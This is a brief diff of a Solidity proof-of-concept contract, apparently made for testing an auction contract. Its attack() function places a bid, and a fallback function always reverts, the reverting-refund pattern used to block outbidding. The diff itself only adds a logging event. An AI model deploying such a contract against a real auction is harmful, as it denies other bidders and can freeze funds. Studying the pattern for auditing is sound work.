@@ -28,8 +28,10 @@ contract POC {
     function attack() public payable onlyOwner {
         auInstance.bid.value(msg.value)();
     }   
+    event hi(string);
     function() external{
         console.log("--1---");
+        emit hi("6666");
         revert("6666");
         console.log("--1---");
     }
